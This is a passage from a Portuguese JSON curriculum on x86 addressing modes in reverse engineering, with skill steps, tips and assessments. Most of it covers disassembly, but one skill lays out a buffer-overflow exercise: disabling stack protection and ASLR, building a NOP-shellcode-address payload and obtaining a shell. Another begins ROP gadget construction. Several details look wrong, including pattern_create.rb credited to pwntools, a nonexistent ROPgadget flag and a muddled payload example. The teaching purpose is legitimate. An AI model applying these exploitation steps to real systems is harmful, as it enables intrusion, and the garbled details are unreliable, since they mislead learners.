                                  "title": "Reconhecer padrões em código desmontado",
                                  "subSteps": [
                                    "Abra um desmontador e localize instruções de memória: busque por colchetes com hex fixo.",
                                    "Analise operandos: Confirme ausência de registradores como [eax] ou [ebx+4].",
                                    "Classifique instruções comuns: MOV, PUSH, CALL com [addr].",
                                    "Marque exemplos: Use highlighter para [0xXXXXXXXX].",
                                    "Compare com binário: Verifique se o endereço corresponde a seções como .data."
                                  ],
                                  "verification": "Identifique 5 instruções de modo direto em um snippet desmontado fornecido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ghidra ou IDA Free, amostra de binário ELF/PE simples",
                                  "tips": "Use busca por regex como '\\[0x[0-9a-fA-F]+\\]' em editores de texto.",
                                  "learningObjective": "Detectar visualmente o padrão [endereço_absoluto] em listings assembly.",
                                  "commonMistakes": "Ignorar offsets pequenos como [0x10], achando ser relativo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar de outros modos de endereçamento",
                                  "subSteps": [
                                    "Liste outros modos: Imediato (valor direto), Registro-indireto [reg], Base+offset [reg+off].",
                                    "Crie tabela comparativa: Colunas para sintaxe, exemplo, uso.",
                                    "Analise ambiguidades: [label] pode ser direto se resolvido para absoluto.",
                                    "Pratique distinção: Classifique 10 instruções mistas.",
                                    "Entenda contexto PIC vs. não-PIC para relocação."
                                  ],
                                  "verification": "Classifique corretamente 10 instruções de uma lista mista como direto ou não.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Tabela comparativa em Excel/Google Sheets, lista de 20 instruções assembly",
                                  "tips": "Regra mnemônica: 'Direto = Destino fixo no mapa da memória'.",
                                  "learningObjective": "Distinguir modo direto de indireto, relativo e outros com 90% acurácia.",
                                  "commonMistakes": "Confundir [rip+off] (relativo RIP) com direto absoluto."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar identificação em análise prática de binários",
                                  "subSteps": [
                                    "Carregue um binário real em desmontador e encontre acessos diretos a strings ou dados.",
                                    "Trace fluxo: Veja se instrução carrega de endereço conhecido como .rodata.",
                                    "Simule execução: Use debugger para confirmar endereço absoluto.",
                                    "Documente achados: Anote ID da instrução e razão de classificação.",
                                    "Teste com varredura: Procure padrões em todo o binário."
                                  ],
                                  "verification": "Gere relatório de 3 instruções diretas encontradas em binário, com screenshots.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "x64dbg ou Ghidra, binário de teste (ex: crackme simples)",
                                  "tips": "Comece por seções .data/.rdata onde endereços diretos são comuns.",
                                  "learningObjective": "Aplicar identificação em cenários reais de reverse engineering.",
                                  "commonMistakes": "Classificar endereços relocados como diretos sem checar runtime."
                                }
                              ],
                              "practicalExample": "Em um desmontador, veja: 0x00401000: MOV eax, [0x401000] — aqui [0x401000] é endereço absoluto fixo, indicando modo direto para carregar valor de memória estática.",
                              "finalVerifications": [
                                "Classificar corretamente 95% de 20 instruções mistas como modo direto.",
                                "Explicar sintaxe [addr] vs. [reg+off] em entrevista simulada.",
                                "Encontrar e documentar 5 acessos diretos em binário real.",
                                "Diferenciar de modo RIP-relativo em executáveis modernos x64.",
                                "Simular execução confirmando endereço absoluto no debugger.",
                                "Criar fluxograma de decisão para identificação de modos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: Sem falsos positivos/negativos em testes.",
                                "Explicação clara: Descreve endereço absoluto vs. calculado.",
                                "Velocidade: Reconhece padrão em <10s por instrução.",
                                "Contexto aplicado: Liga a seções binárias (.data etc.).",
                                "Diferenciação robusta: Maneja ambiguidades PIC/relocação.",
                                "Documentação: Relatórios com evidências visuais."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Baixo Nível: Entender como compiladores geram modos de acesso.",
                                "Sistemas Operacionais: Acessos diretos a memória kernel/user.",
                                "Segurança de Software: Identificar leaks em binários via acessos estáticos.",
                                "Arquitetura de Computadores: Evolução de modos em x86 para x64."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar MOV reg, [hardcoded_addr] revela C2 servers estáticos; em RE de software, detecta strings hardcoded para bypass de licenças."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.2",
                            "name": "Calcular acesso à memória em modo direto",
                            "description": "Determinar o endereço exato acessado em binários ELF/PE durante análise estática, considerando offsets de seções como .data ou .bss.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as estruturas de binários ELF e PE",
                                  "subSteps": [
                                    "Estude o ELF Header, Program Headers e Section Headers usando documentação oficial.",
                                    "Analise o PE: DOS Stub, NT Headers (optional e image headers) e Section Table.",
                                    "Identifique seções relevantes como .text (código), .data (dados inicializados), .bss (dados não inicializados).",
                                    "Note os campos: file offset, virtual address (VA), size e flags.",
                                    "Pratique com readelf -h e objdump -h em um binário simples."
                                  ],
                                  "verification": "Explique em voz alta ou anote os campos chave de um header de seção exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas: readelf, objdump, dumpbin; Binários ELF/PE de teste; Docs: elf.pdf, pe.pdf"
                                  ],
                                  "tips": "Use readelf -S para seções ELF e objdump -h para headers; foque em VA e offset.",
                                  "learningObjective": "Identificar componentes que definem endereços virtuais de seções.",
                                  "commonMistakes": [
                                    "Confundir file offset com virtual address.",
                                    "Ignorar alinhamentos de seção (geralmente 0x1000)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Extrair offsets e endereços virtuais das seções",
                                  "subSteps": [
                                    "Execute readelf -S binario.elf ou objdump -h binario para listar seções.",
                                    "Registre VA base e tamanho de .data e .bss (ex: .data VA=0x0804a000).",
                                    "Para PE, use dumpbin /headers ou CFF Explorer para section RVA (Relative Virtual Address).",
                                    "Calcule VA completo: ImageBase + RVA para PE.",
                                    "Anote offsets relativos dentro da seção para acessos."
                                  ],
                                  "verification": "Crie uma tabela com VA, offset e tamanho para 3 seções principais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário de teste com seções conhecidas; Calculadora hexadecimal"
                                  ],
                                  "tips": "ELF VAs começam tipicamente em 0x08048000; PE ImageBase padrão 0x400000.",
                                  "learningObjective": "Mapear seções do arquivo para endereços de memória virtuais.",
                                  "commonMistakes": [
                                    "Usar file offset em vez de VA.",
                                    "Esquecer de somar ImageBase em PE."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar instruções de acesso direto à memória",
                                  "subSteps": [
                                    "Desassemble o binário com objdump -d binario ou IDA/Ghidra free.",
                                    "Procure instruções como MOV [0x401000], eax ou LEA eax, [0x0804a020].",
                                    "Confirme modo direto: endereço imediato hardcoded na instrução (não rip-relative).",
                                    "Anote o endereço imediato da operand (ex: 0x0804a000).",
                                    "Compare com VAs de seções para contextualizar."
                                  ],
                                  "verification": "Liste 2 instruções de modo direto de um disassembly com seus endereços.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "objdump, Ghidra ou radare2; Binário com acessos conhecidos"
                                  ],
                                  "tips": "Filtros: grep '\\[0x' disassembly.txt; modo direto não usa registradores.",
                                  "learningObjective": "Reconhecer padrões de modo direto em assembly x86/x64.",
                                  "commonMistakes": [
                                    "Confundir com modo indireto (ex: [rax+8]).",
                                    "Interpretar rip-relative como direto."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular o endereço exato de acesso",
                                  "subSteps": [
                                    "Some offset da instrução ao VA da seção se relativo (raro em direto).",
                                    "Para direto absoluto: endereço na instrução É o VA acessado (ex: [0x0804a100] acessa .data+0x100).",
                                    "Ajuste para ASLR off em análise estática: use VAs do header.",
                                    "Valide cruzando com símbolos se disponíveis (nm ou readelf -s).",
                                    "Documente: 'Instrução em 0x08048450 acessa 0x0804a100 (.data + 0x100)'."
                                  ],
                                  "verification": "Calcule e anote endereço para 3 instruções exemplo.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Disassembly anotado; Calculadora para hex (bc ou python)"
                                  ],
                                  "tips": "Use python: print(hex(0x0804a000 + 0x100)); ignore reloc em static analysis.",
                                  "learningObjective": "Computar precisamente o endereço de memória alvo.",
                                  "commonMistakes": [
                                    "Adicionar offset errado.",
                                    "Misturar file offset com VA."
                                  ]
                                }
                              ],
                              "practicalExample": "Binário ELF simples: objdump -h mostra .data VA=0x0804a000, size=0x100. Disassembly: 8048450: mov dword ptr [0x0804a020], 0x1. Cálculo: acessa 0x0804a020 (.data + 0x20), endereço exato para variável global.",
                              "finalVerifications": [
                                "Calcule corretamente VA para 5 acessos diretos em binário teste.",
                                "Explique diferença entre VA de seção e endereço na instrução.",
                                "Identifique seção (.data/.bss) para cada acesso calculado.",
                                "Valide com debugger estático (Ghidra cross-ref).",
                                "Ajuste cálculo para PE com ImageBase 0x400000 + RVA 0x2000 = 0x402000.",
                                "Documente 1 relatório de análise com 3 cálculos."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de VA (100% correto em testes).",
                                "Correta identificação de modo direto vs. outros.",
                                "Uso correto de ferramentas para extrair headers.",
                                "Explicação clara de offsets e seções.",
                                "Tratamento de edge cases como alinhamentos.",
                                "Eficiência: tempo dentro dos estimados."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: compreensão de opcodes de memória.",
                                "Sistemas Operacionais: mapeamento de seções para memória virtual.",
                                "Engenharia Reversa: uso de disassemblers em RE.",
                                "Programação C: linkagem de variáveis globais para .data/.bss.",
                                "Criptografia: análise de chaves hardcoded em memória."
                              ],
                              "realWorldApplication": "Em análise de malware, calcular acessos diretos revela onde malicioso armazena C2 IPs ou payloads em .data, permitindo detecção via YARA rules ou patching em exploits."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.3",
                            "name": "Analisar vulnerabilidades com modo direto",
                            "description": "Avaliar como modos diretos facilitam injeções de shellcode em buffer overflows, identificando endereços fixos exploráveis em chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Conceitos de Modo Direto em Assembly x86",
                                  "subSteps": [
                                    "Estude a definição de modo direto: uso de endereços absolutos em operandos sem base/registro.",
                                    "Identifique instruções comuns como CALL, JMP e INT que utilizam modo direto para chamadas de sistema.",
                                    "Analise o formato de opcode em documentação Intel para modo direto (ex: 0xE8 para CALL rel, vs. absoluto).",
                                    "Compare com modos indiretos para entender por que direto facilita exploits fixos.",
                                    "Pratique decodificando instruções simples com ferramentas como ndisasm."
                                  ],
                                  "verification": "Liste 5 instruções x86 que usam modo direto e explique seu formato de bytes.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação Intel x86 Manual (Vol. 2)",
                                    "ndisasm ou objdump",
                                    "Editor de texto para assembly snippets"
                                  ],
                                  "tips": "Foquem em exemplos de chamadas de sistema como int 0x80 ou call *system para fixos.",
                                  "learningObjective": "Compreender como o modo direto expõe endereços previsíveis em binários estáticos.",
                                  "commonMistakes": "Confundir modo direto com relativo (EIP-based); sempre verifique o mapa de memória ASLR off."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dissecar Binário Vulnerável com Chamadas de Sistema",
                                  "subSteps": [
                                    "Compile um binário C simples com buffer overflow e chamada system() sem ASLR.",
                                    "Use objdump -d para listar instruções e identificar modos de endereçamento em chamadas.",
                                    "Localize endereços fixos de funções como system ou /bin/sh usando strings e gdb.",
                                    "Anote offsets de instruções CALL/JMP diretas para endereços absolutos.",
                                    "Valide com gdb: desmonte e examine registradores durante execução."
                                  ],
                                  "verification": "Gere relatório com 3 endereços fixos identificados e suas instruções assembly.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GCC para compilar C vulnerável",
                                    "objdump, gdb, strings",
                                    "Binário exemplo: vuln.c com gets() e system()"
                                  ],
                                  "tips": "Compile com -fno-stack-protector -z execstack -no-pie para simular ambiente explorável.",
                                  "learningObjective": "Identificar padrões de modo direto em binários reais de chamadas de sistema.",
                                  "commonMistakes": "Ignorar relocação PIE; teste em ambiente controlado sem ASLR (echo 0 > /proc/sys/kernel/randomize_va_space)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Impacto em Buffer Overflows",
                                  "subSteps": [
                                    "Simule overflow: calcule tamanho do buffer até EIP overwrite.",
                                    "Crie shellcode simples que usa JMP direto para endereço fixo de system.",
                                    "Teste injeção com python struct.pack para payload: NOPs + shellcode + endereço fixo.",
                                    "Execute em gdb para observar controle de fluxo via modo direto.",
                                    "Registre ROP-like chains se múltiplos endereços fixos disponíveis."
                                  ],
                                  "verification": "Demonstre exploit bem-sucedido obtendo shell interativa via buffer overflow.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Python para payload",
                                    "gdb-peda ou gef plugin",
                                    "Metasploit msfvenom para shellcode básico"
                                  ],
                                  "tips": "Use pattern_create.rb (pwntools) para encontrar offset exato do EIP.",
                                  "learningObjective": "Avaliar como endereços fixos em modo direto bypassam randomização parcial.",
                                  "commonMistakes": "Shellcode com null bytes; use XOR para evitar e teste em little-endian."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Documentar Vulnerabilidades",
                                  "subSteps": [
                                    "Compile relatório: riscos de modo direto em overflows (ex: predictability).",
                                    "Teste mitigações: ative ASLR, NX, canary e reavalie exploit.",
                                    "Compare com modo indireto: por que direto é mais explorável.",
                                    "Crie PoC script automatizado para análise.",
                                    "Discuta cenários reais como legacy software."
                                  ],
                                  "verification": "Produza PoC + relatório PDF com screenshots de gdb e análise.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Pwntools para automação",
                                    "VirtualBox para VM isolada",
                                    "Templates de relatório LaTeX/Markdown"
                                  ],
                                  "tips": "Sempre isole testes em VM para evitar comprometer host.",
                                  "learningObjective": "Documentar análise completa de vulnerabilidades modo direto.",
                                  "commonMistakes": "Subestimar mitigações modernas; sempre teste com e sem elas."
                                }
                              ],
                              "practicalExample": "Em um binário vuln.c com gets(buffer) seguido de system(\"/bin/sh\"), objdump revela CALL 0x8048500 (modo direto para system). Payload: 100 NOPs + shellcode JMP 0x8048500 + overflow para EIP, resultando em shell ao executar ./vuln < payload.",
                              "finalVerifications": [
                                "Identificar corretamente 3+ instruções modo direto em binário desmontado.",
                                "Criar e executar PoC de buffer overflow usando endereço fixo.",
                                "Explicar por que modo direto facilita shellcode vs. indireto.",
                                "Demonstrar falha do exploit com ASLR ativado.",
                                "Documentar 2 mitigações efetivas com testes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de assembly (90%+ correto).",
                                "Sucesso no PoC exploit (shell obtida).",
                                "Profundidade da análise de riscos (cobre predictability e chains).",
                                "Qualidade do relatório (claro, com evidências visuais).",
                                "Compreensão de mitigações (testadas e explicadas).",
                                "Criatividade em conexões reais (ex: CTF scenarios)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Decodificação de opcodes.",
                                "Sistemas Operacionais: Syscalls e gerenciamento de memória.",
                                "Engenharia Reversa: Uso de disassemblers como IDA/Ghidra.",
                                "Criptografia: Entropia em endereços vs. predictability.",
                                "Redes: Exploração remota via buffer overflows em serviços."
                              ],
                              "realWorldApplication": "Pentesters usam essa análise em audits de binários legacy (ex: old routers) para encontrar exploits zero-day; ferramentas como ROPgadget automatizam busca por gadgets com modos diretos, essencial em CTFs e bug bounties."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.2",
                        "name": "Modo de Endereçamento Indireto",
                        "description": "No modo indireto, o endereço de memória é obtido do conteúdo de um registrador ou localização apontada, introduzindo uma camada de indireção para acessos dinâmicos.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.2.1",
                            "name": "Reconhecer sintaxe de modo indireto",
                            "description": "Identificar padrões como MOV eax, [ebx] em assembly 32/64 bits, onde ebx contém o endereço efetivo, em ferramentas como objdump ou IDA Pro.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Modos de Endereçamento em x86/x64 Assembly",
                                  "subSteps": [
                                    "Revise os modos de endereçamento básicos: direto, indireto, indexado e baseado.",
                                    "Estude a hierarquia de registradores em 32/64 bits (EAX/RAX, EBX/RBX, etc.).",
                                    "Identifique como o processador calcula endereços efetivos usando registradores.",
                                    "Compare modo direto (ex: MOV EAX, [0x1234]) vs. indireto (ex: MOV EAX, [EBX]).",
                                    "Anote diferenças entre 32-bit (prefixos) e 64-bit (RIP-relative)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre modo direto e indireto com exemplos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86 manuals (Volume 2), diagramas de modos de endereçamento.",
                                  "tips": "Use diagramas visuais para mapear registrador -> endereço -> memória.",
                                  "learningObjective": "Compreender como o modo indireto usa registradores para acessar memória dinamicamente.",
                                  "commonMistakes": "Confundir colchetes [] com arrays em linguagens high-level; [] sempre denotam indireção em assembly."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer a Sintaxe Específica do Modo Indireto",
                                  "subSteps": [
                                    "Memorize padrões: MOV reg, [reg_base] ou MOV reg, [reg_base + offset].",
                                    "Pratique parsing: Em 'MOV EAX, [EBX]', EBX é o registrador com endereço efetivo.",
                                    "Diferencie de modos compostos: [EBX + EAX*4] é indexado, não puro indireto.",
                                    "Estude variações: [EBP] para stack, [ESP] para heap-like access.",
                                    "Liste 10 exemplos de instruções comuns (MOV, ADD, CMP) no modo indireto."
                                  ],
                                  "verification": "Liste 5 instruções de exemplo e identifique o modo indireto corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Cheat sheets de sintaxe x86 (ex: Felippe's x86 Cheat Sheet), exemplos de código assembly simples.",
                                  "tips": "Foco nos colchetes ao redor de registradores únicos sem offset ou escala.",
                                  "learningObjective": "Identificar precisamente a sintaxe [reg] como modo indireto em instruções assembly.",
                                  "commonMistakes": "Ignorar offsets pequenos; [EBX + 4] ainda é indireto baseado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Ferramentas de Desassembly: objdump e IDA Pro",
                                  "subSteps": [
                                    "Instale objdump (parte do binutils) e abra um binário ELF simples.",
                                    "Execute 'objdump -d binary' e procure por instruções com [].",
                                    "No IDA Pro, carregue um executável e navegue pelo disassembly view.",
                                    "Use busca por padrões como '[e?x' para filtrar modos indiretos.",
                                    "Compare output de ambas ferramentas em um mesmo binário."
                                  ],
                                  "verification": "Capture screenshot de 3 instruções indiretas identificadas em objdump/IDA.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Binutils (objdump), IDA Pro Free (demo), binários de teste como /bin/ls ou exemplos de CTF.",
                                  "tips": "Comece com binários estáticos; use -M intel para sintaxe Intel no objdump.",
                                  "learningObjective": "Usar ferramentas profissionais para visualizar e reconhecer sintaxe em código real desmontado.",
                                  "commonMistakes": "Confundir com modo RIP-relative em 64-bit (ex: [rip + offset])."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação em Binários Reais e Cenários Complexos",
                                  "subSteps": [
                                    "Analise um binário de malware ou crackme com múltiplas instruções de memória.",
                                    "Marque todas as ocorrências de modo indireto e anote o registrador usado.",
                                    "Simule execução: Trace como EBX é populado antes de MOV EAX, [EBX].",
                                    "Crie um quiz pessoal: 20 instruções mistas, classifique como indireto ou não.",
                                    "Discuta em fóruns ou grave vídeo explicando 2 exemplos complexos."
                                  ],
                                  "verification": "Submeta relatório com 10 exemplos anotados de binários reais.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Binários de CTF (ex: picoCTF), Ghidra como alternativa gratuita, debugger como x64dbg.",
                                  "tips": "Combine com stepping em debugger para ver valores reais de registradores.",
                                  "learningObjective": "Aplicar reconhecimento em contextos reais de análise de binários.",
                                  "commonMistakes": "Sobrepor com LEA (Load Effective Address), que usa [] mas não acessa memória."
                                }
                              ],
                              "practicalExample": "Em um binário desmontado via objdump: 'mov eax, [ebx+0x10]'. Aqui, EBX contém o endereço base de uma estrutura, +0x10 é offset para um campo; identifique como indireto baseado para acessar dados dinâmicos como ponteiros em C.",
                              "finalVerifications": [
                                "Identifica corretamente 95% das instruções modo indireto em um disassembly de 50 linhas.",
                                "Explica o papel do registrador em [reg] como detentor do endereço efetivo.",
                                "Diferencia modo indireto puro de indexado/escalado em exemplos mistos.",
                                "Localiza padrões em objdump e IDA Pro sem erros de sintaxe.",
                                "Traça fluxo: Mostra como registrador é setado antes da instrução indireta.",
                                "Aplica em 64-bit, reconhecendo RAX/RIP diferenças."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de sintaxe [reg] vs. outros modos (90%+ acerto).",
                                "Proficiência em ferramentas: Tempo para encontrar 5 exemplos <5 min.",
                                "Explicação clara do endereço efetivo e implicações de segurança.",
                                "Análise contextual: Liga indireto a acessos de heap/stack.",
                                "Criatividade em exemplos: Fornece variações 32/64-bit autênticas.",
                                "Evita erros comuns: Não confunde com LEA ou direto."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Equivalente a ponteiros (*ptr = value).",
                                "Sistemas Operacionais: Acesso a estruturas de processos via registradores.",
                                "Engenharia Reversa: Base para análise de exploits buffer overflow.",
                                "Arquitetura de Computadores: Ciclo de fetch-decode-execute com EA calculation.",
                                "Segurança: Detecção de ROP gadgets usando indiretos."
                              ],
                              "realWorldApplication": "Em análise de malware, reconhecer 'mov eax, [ebx]' ajuda a mapear acessos a dados roubados (ex: credenciais em memória); em pentesting, identifica primitivas para exploits como ret2libc onde ponteiros indiretos são manipulados."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.2",
                            "name": "Rastrear indireções em fluxo de execução",
                            "description": "Seguir chains de indireções em código reverso para mapear acessos a memória durante execução de chamadas de sistema como int 0x80 ou syscall.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e disassemblar o binário",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de análise estática como Ghidra ou IDA Pro.",
                                    "Identifique a arquitetura (ex: x86 32-bit) e configure o disassembly para modo flat ou com segmentos corretos.",
                                    "Localize funções ou seções relevantes contendo chamadas de sistema (int 0x80 ou syscall).",
                                    "Anote registradores e endereços iniciais envolvidos na execução.",
                                    "Exporte o grafo de controle de fluxo (CFG) para visualização."
                                  ],
                                  "verification": "Confirme que o disassembly mostra instruções claras como 'call [eax]' ou 'int 0x80' sem erros de parsing.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ghidra/IDA Pro, binário de exemplo com syscalls indiretas",
                                  "tips": "Use scripts de auto-análise para destacar syscalls comuns.",
                                  "learningObjective": "Configurar ferramentas para análise estática de binários x86.",
                                  "commonMistakes": "Ignorar alinhamento de bytes ou modo de endereçamento (16-bit vs 32-bit)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar chains de indireção nas chamadas de sistema",
                                  "subSteps": [
                                    "Procure instruções de indireção como 'mov eax, [ebx+4]' ou 'call [reg]'.",
                                    "Trace backwards de 'int 0x80' ou 'syscall' para encontrar registradores populados indiretamente.",
                                    "Marque chains: ex. eax <- [ebx] <- [edi+offset].",
                                    "Anote dependências de memória e registradores em um diagrama.",
                                    "Valide se a indireção leva a tabelas de syscalls ou parâmetros dinâmicos."
                                  ],
                                  "verification": "Crie um mapa textual ou gráfico mostrando a chain completa até o syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramenta de disassembly, papel/diagrama digital (ex: draw.io)",
                                  "tips": "Use cross-references (xrefs) nas ferramentas para acelerar o trace.",
                                  "learningObjective": "Reconhecer e mapear modos de endereçamento indireto em assembly.",
                                  "commonMistakes": "Confundir indireção com indireção registrada vs baseada em memória."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular o fluxo de execução e mapear acessos a memória",
                                  "subSteps": [
                                    "Assuma valores iniciais para registradores e memória (ex: via breakpoints simbólicos).",
                                    "Simule passo a passo: resolva cada indireção sequencialmente.",
                                    "Registre acessos a memória: endereço, tamanho, tipo (read/write).",
                                    "Identifique parâmetros do syscall resolvidos via indireções.",
                                    "Atualize o diagrama com valores simulados e fluxos condicionais."
                                  ],
                                  "verification": "A simulação reproduz corretamente o número e tipo de syscall (ex: sys_open via indireção).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Emulador como Unicorn Engine ou simulação manual em spreadsheet",
                                  "tips": "Comece com binários simples para validar a técnica antes de complexos.",
                                  "learningObjective": "Simular execução dinâmica de chains indiretas sem rodar o código.",
                                  "commonMistakes": "Perder fluxos condicionais (jumps) que alteram registradores."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar com depuração dinâmica e análise de runtime",
                                  "subSteps": [
                                    "Anexe um debugger como GDB ou x64dbg ao binário em ambiente controlado.",
                                    "Defina breakpoints nos pontos de indireção e syscall.",
                                    "Execute e inspecione valores reais de memória e registradores durante runtime.",
                                    "Compare com a simulação estática e ajuste o mapa de acessos.",
                                    "Registre dumps de memória para offsets indiretos."
                                  ],
                                  "verification": "Os acessos mapeados no runtime coincidem com a simulação estática em 100%.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "GDB/x64dbg, VM isolada para execução segura",
                                  "tips": "Use 'info registers' e 'x/10i $pc' no GDB para traces rápidos.",
                                  "learningObjective": "Integrar análise estática e dinâmica para validação de indireções.",
                                  "commonMistakes": "Executar em ambiente não-isolado, causando crashes ou detecção."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e analisar impactos de segurança",
                                  "subSteps": [
                                    "Compile o mapa completo: chains, acessos, syscalls resolvidos.",
                                    "Identifique vulnerabilidades potenciais (ex: ROP via indireções).",
                                    "Teste variações: altere memória e re-trace o fluxo.",
                                    "Gere relatório com screenshots e diagramas.",
                                    "Discuta cenários de exploração baseados nos acessos mapeados."
                                  ],
                                  "verification": "Relatório explica como uma indireção leva a um syscall malicioso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Editor de texto/Markdown, ferramentas de diagrama",
                                  "tips": "Padronize templates de relatório para eficiência.",
                                  "learningObjective": "Conectar tracing técnico a implicações de segurança.",
                                  "commonMistakes": "Focar só no trace sem contextualizar riscos."
                                }
                              ],
                              "practicalExample": "Em um binário x86-32, trace 'int 0x80' onde eax = [ebx+8], ebx = [0x8040a00 + input_offset]. Simule input=4 para eax=sys_write, mapeando writes para fd indireto em [esp+4].",
                              "finalVerifications": [
                                "Mapa completo das chains indiretas até syscall.",
                                "Lista exaustiva de acessos read/write com offsets.",
                                "Simulação estática bate com depuração dinâmica.",
                                "Diagrama visual do fluxo de execução.",
                                "Identificação correta de parâmetros syscall.",
                                "Relatório documenta pelo menos um cenário de risco."
                              ],
                              "assessmentCriteria": [
                                "Precisão no tracing de pelo menos 3 níveis de indireção.",
                                "Correta distinção entre modos de endereçamento.",
                                "Validação runtime sem discrepâncias.",
                                "Análise de segurança contextualizada.",
                                "Eficiência: trace completo em <2 horas.",
                                "Clareza na documentação e diagramas."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly e Arquitetura x86.",
                                "Engenharia Reversa e Malware Analysis.",
                                "Sistemas Operacionais (Syscalls Internals).",
                                "Debugging e Ferramentas de Análise Binária.",
                                "Exploração de Vulnerabilidades (ROP, Heap Sprays)."
                              ],
                              "realWorldApplication": "Em análise de malware, rastrear indireções em droppers revela C2 servers via sys_connect dinâmico; em forensics, mapeia acessos para reconstruir execuções pós-exploitation em binários ofuscados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.3",
                            "name": "Explorar indireções em ROP",
                            "description": "Utilizar modos indiretos para construir gadgets em return-oriented programming, alterando fluxos para execução de shellcodes arbitrários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Modos de Endereçamento Indireto em Assembly",
                                  "subSteps": [
                                    "Estude a sintaxe de instruções indiretas como 'jmp [reg]', 'call [reg+offset]' em x86/x86-64.",
                                    "Analise como registradores (e.g., rax, rbx) atuam como ponteiros para memória controlada pelo atacante.",
                                    "Pratique disassemblando binários simples com ROPgadget ou objdump para identificar padrões indiretos.",
                                    "Compare indireto vs. direto: indireto permite redirecionamento dinâmico baseado em valores de pilha.",
                                    "Teste em um debugger (GDB) carregando um binário e modificando registradores para simular fluxos."
                                  ],
                                  "verification": "Desmonte um binário e liste 3 gadgets indiretos com endereços e registradores envolvidos.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "GDB ou pwndbg",
                                    "ROPgadget tool",
                                    "Binário de exemplo vulnerável (e.g., de CTF)",
                                    "Documentação Intel x86 manual (Volume 2)"
                                  ],
                                  "tips": [
                                    "Use 'ROPgadget --binary vuln.bin --indirect' para filtrar gadgets.",
                                    "Sempre verifique alinhamento de pilha em 8 bytes para x64."
                                  ],
                                  "learningObjective": "Dominar como indireções permitem controle dinâmico de fluxo em ROP sem gadgets diretos.",
                                  "commonMistakes": [
                                    "Confundir indireto com registro direto.",
                                    "Ignorar offsets em [reg + disp].",
                                    "Esquecer de pop valores para registradores antes do jmp."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Extrair Gadgets Indiretos em Binários",
                                  "subSteps": [
                                    "Execute ROPgadget com flags para indireções: '--indirect' e '--string shellcode'.",
